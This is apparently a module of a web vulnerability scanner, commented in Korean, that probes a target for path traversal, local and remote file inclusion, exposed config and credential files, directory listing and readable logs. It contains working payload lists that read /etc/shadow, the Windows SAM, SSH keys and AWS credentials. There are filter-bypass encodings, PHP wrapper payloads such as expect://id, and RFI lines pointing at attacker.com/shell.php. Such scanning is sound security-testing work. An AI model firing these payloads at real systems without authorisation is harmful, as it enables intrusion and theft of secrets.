"""
Path Traversal (경로 순회) 취약점
Directory Traversal, LFI, RFI 탐지
"""
import requests

def scan(target_url):
    result = {
        'name': 'Path Traversal (경로 순회)',
        'category': 'File Security',
        'status': 'SAFE',
        'severity': 'HIGH',
        'vulnerabilities': [],
        'recommendation': '파일 경로 검증, 화이트리스트, chroot jail, 절대 경로 사용 금지',
        'details': ''
    }
    
    details = []
    
    # 경로 순회 페이로드 (다양한 우회 기법)
    traversal_payloads = [
        # 기본 Unix/Linux
        ("../../../etc/passwd", "Linux passwd", ["root:", "bin/bash", "daemon:"]),
        ("../../../../etc/shadow", "Linux shadow", ["root:", "$6$", "$y$"]),
        ("../../../etc/hosts", "hosts file", ["localhost", "127.0.0.1"]),
        ("../../../../proc/self/environ", "Process environ", ["PATH=", "USER=", "HOME="]),
        ("../../../var/log/apache2/access.log", "Apache logs", ["GET", "POST", "HTTP"]),
        
        # Windows
        ("..\\..\\..\\windows\\system32\\config\\sam", "Windows SAM", ["SAM", "[boot loader]"]),
        ("..\\..\\..\\windows\\win.ini", "Windows INI", ["[fonts]", "[extensions]"]),
        ("..\\..\\..\\boot.ini", "boot.ini", ["[boot loader]", "[operating systems]"]),
        
        # URL 인코딩
        ("..%2F..%2F..%2Fetc%2Fpasswd", "URL Encoded", ["root:"]),
        ("..%252F..%252F..%252Fetc%252Fpasswd", "Double Encoded", ["root:"]),
        ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "Full URL Encoded", ["root:"]),
        
        # Null Byte (구형 시스템)
        ("../../../etc/passwd%00", "Null Byte", ["root:"]),
        ("../../../etc/passwd%00.jpg", "Null Byte Extension", ["root:"]),
        
        # 절대 경로
        ("/etc/passwd", "Absolute Path", ["root:"]),
        ("C:\\windows\\win.ini", "Windows Absolute", ["[fonts]"]),
        
        # 필터 우회
        ("....//....//....//etc/passwd", "Double Dot Slash", ["root:"]),
        ("..;/..;/..;/etc/passwd", "Semicolon", ["root:"]),
        ("....\\\\....\\\\....\\\\windows\\win.ini", "Double Backslash", ["[fonts]"]),
        
        # Unicode
        ("..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "Unicode Bypass", ["root:"]),
        
        # Mixed
        ("../../../etc/passwd", "Mixed 1", ["root:"]),
        ("..\\../\\..\\..\\etc/passwd", "Mixed 2", ["root:"]),
    ]
    
    # 1. 파일 다운로드 엔드포인트 테스트
    details.append("[경로순회-1] 파일 다운로드 경로 순회")
    
    download_endpoints = [
        f"{target_url}/api/files/download",
        f"{target_url}/api/teams/1/files/download",
        f"{target_url}/download",
        f"{target_url}/file",
    ]
    
    param_names = ['filename', 'file', 'path', 'name', 'filepath', 'document']
    
    for endpoint in download_endpoints:
        for payload, attack_name, indicators in traversal_payloads:
            for param_name in param_names:
                try:
                    params = {param_name: payload}
                    headers = {'X-Security-Mode': 'vulnerable'}
                    
                    resp = requests.get(endpoint, params=params, headers=headers, timeout=5)
                    
                    # 404 Optimization
                    if resp.status_code == 404:
                        break # Skip this endpoint/param combo if it doesn't exist
                    
                    
                    # 민감한 파일 내용 확인
                    if any(indicator in resp.text for indicator in indicators):
                        result['vulnerabilities'].append(f"Path Traversal: {endpoint}?{param_name}={attack_name}")
                        details.append(f"  ✗ {attack_name} 성공")
                        details.append(f"    {endpoint}?{param_name}={payload[:30]}...")
                        result['status'] = 'VULNERABLE'
                        break
                        
                except:
                    pass
                
                if result['status'] == 'VULNERABLE':
                    break
                    
            if result['status'] == 'VULNERABLE':
                break
                
        if result['status'] == 'VULNERABLE':
            break
    
    # 2. 파일 포함 (LFI - Local File Inclusion)
    details.append("\n[경로순회-2] LFI (Local File Inclusion)")
    
    try:
        lfi_payloads = [
            "../../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "php://filter/read=convert.base64-encode/resource=index.php",
            "file:///etc/passwd",
            "expect://id",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",  # <?php phpinfo(); ?>
        ]
        
        for payload in lfi_payloads:
            params = {'page': payload, 'include': payload, 'template': payload}
            
            resp = requests.get(target_url, params=params, timeout=5)
            
            # LFI 성공 지표
            lfi_indicators = ['root:', 'daemon:', 'bin/bash', 'base64', '<?php']
            
            if any(indicator in resp.text for indicator in lfi_indicators):
                result['vulnerabilities'].append(f"LFI: {payload[:50]}")
                details.append(f"  ✗ LFI 취약점 발견")
                result['status'] = 'VULNERABLE'
                break
                
    except:
        details.append("  • LFI 테스트 실패")
    
    # 3. 원격 파일 포함 (RFI - Remote File Inclusion)
    details.append("\n[경로순회-3] RFI (Remote File Inclusion)")
    
    try:
        # 실제로는 공격용 서버가 필요하지만, 테스트용으로 공개 URL 사용
        rfi_payloads = [
            "http://example.com/shell.txt",
            "https://pastebin.com/raw/malicious",
            "ftp://attacker.com/shell.php",
        ]
        
        for payload in rfi_payloads:
            params = {'page': payload, 'include': payload}
            
            try:
                resp = requests.get(target_url, params=params, timeout=5)
                
                # 외부 리소스 로드 시도 확인
                if resp.status_code == 200 and len(resp.text) > 100:
                    # 실제로 외부 파일을 로드했는지는 알 수 없지만, 
                    # 에러가 없으면 RFI 가능성
                    details.append(f"  ⚠ RFI 가능성: {payload}")
                    
            except:
                pass
                
    except:
        details.append("  • RFI 테스트 불가")
    
    # 4. 정적 파일 접근
    details.append("\n[경로순회-4] 민감 파일 직접 접근")
    
    sensitive_files = [
        "/.env",
        "/.git/config",
        "/.git/HEAD",
        "/config/database.yml",
        "/WEB-INF/web.xml",
        "/META-INF/context.xml",
        "/application.properties",
        "/config.php",
        "/../../../pom.xml",
        "/composer.json",
        "/package.json",
        "/.htaccess",
        "/web.config",
        "/.aws/credentials",
        "/.ssh/id_rsa",
    ]
    
    for file_path in sensitive_files:
        try:
            url = f"{target_url}{file_path}"
            resp = requests.get(url, timeout=5)
            
            if resp.status_code == 200 and len(resp.text) > 0:
                # 설정 파일 특징 확인
                config_indicators = [
                    'password', 'secret', 'key', 'token', 'database',
                    'DB_', 'API_', 'AWS_', 'PRIVATE', 'credentials'
                ]
                
                if any(indicator in resp.text for indicator in config_indicators):
                    result['vulnerabilities'].append(f"민감 파일 노출: {file_path}")
                    details.append(f"  ✗ {file_path} 접근 가능")
                    result['status'] = 'VULNERABLE'
                    
        except:
            pass
    
    # 5. 디렉터리 리스팅
    details.append("\n[경로순회-5] 디렉터리 리스팅")
    
    test_dirs = [
        "/uploads/",
        "/files/",
        "/images/",
        "/static/",
        "/public/",
        "/assets/",
        "/backup/",
        "/tmp/",
    ]
    
    for test_dir in test_dirs:
        try:
            resp = requests.get(f"{target_url}{test_dir}", timeout=5)
            
            # 디렉터리 리스팅 지표
            listing_indicators = [
                'Index of',
                'Directory listing',
                'Parent Directory',
                '[DIR]',
                '<title>Directory',
            ]
            
            if any(indicator in resp.text for indicator in listing_indicators):
                result['vulnerabilities'].append(f"디렉터리 리스팅: {test_dir}")
                details.append(f"  ✗ {test_dir} 리스팅 허용")
                result['status'] = 'VULNERABLE'
                
        except:
            pass
    
    # 6. 로그 파일 접근
    details.append("\n[경로순회-6] 로그 파일 접근")
    
    log_files = [
        "/logs/access.log",
        "/logs/error.log",
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
        "/app.log",
        "/debug.log",
        "../../../var/log/auth.log",
    ]
    
    for log_file in log_files:
        try:
            resp = requests.get(f"{target_url}{log_file}", timeout=5)
            
            if resp.status_code == 200 and len(resp.text) > 0:
                log_indicators = ['GET', 'POST', 'HTTP', '200', '404', 'error', 'Exception']
                
                if any(indicator in resp.text for indicator in log_indicators):
                    result['vulnerabilities'].append(f"로그 파일 노출: {log_file}")
                    details.append(f"  ✗ {log_file} 접근 가능")
                    result['status'] = 'VULNERABLE'
                    
        except:
            pass
    
    if result['status'] == 'SAFE':
        details.append("\n✓ 경로 순회 방어가 잘 되어 있습니다")
    
    result['details'] = '\n'.join(details)
    return result